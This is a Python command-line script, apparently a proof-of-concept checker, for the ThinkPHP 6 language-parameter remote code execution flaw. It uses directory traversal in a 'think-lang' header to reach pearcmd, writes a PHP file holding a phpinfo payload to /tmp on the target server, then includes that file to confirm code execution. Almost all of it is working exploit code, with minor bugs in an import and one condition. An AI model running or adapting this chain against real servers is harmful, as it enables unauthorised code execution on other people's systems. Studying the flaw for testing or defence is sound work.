import urllib
import sys


def get_headers(path):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "think-lang": "../../../../../../../.." + path,
        "Connection": "close",
        "Cookie": "think_lang=zh-cn",
        "Upgrade-Insecure-Requests": "1",
    }
    return headers


class request_custom(object):
    def __init__(self, url, headers):
        try:
            res = urllib.request.Request(url, headers=headers)
            response = urllib.request.urlopen(res)
            self.status_code = response.status
            self.headers = response.headers
            self.reason = response.reason
            self.url = response.url
            self.text = response.read().decode('utf-8')
        except Exception as e:
            self.status_code = 404
            self.text = str(e)


def check_tp6(url):
    url1 = url + "/public/index.php?+config-create+/<?=phpinfo()?>+/tmp/jmc.php"
    res = request_custom(url=url1, headers=get_headers("/usr/local/lib/php/pearcmd"))
    print(res.status_code)
    if res.status_code == 404:
        print("无法访问网站", url)

    if res.status_code == 200 and "CONFIGURATION" in res.text:
        url2 = url + "/public/index.php"
        res = request_custom(url=url2, headers=get_headers("/tmp/jmc"))
        # print(res.status_code)
        # print(res.text)
        if "php" and "version" in res.text:
            print("[++++]Thinkphp_lang_rce漏洞存在")
        else:
            print("[---]Thinkphp_lang_rce漏洞不存在")


if __name__ == "__main__":
    print("[+]Author:JMC[+]")
    url = sys.argv[1]
    check_tp6(url)


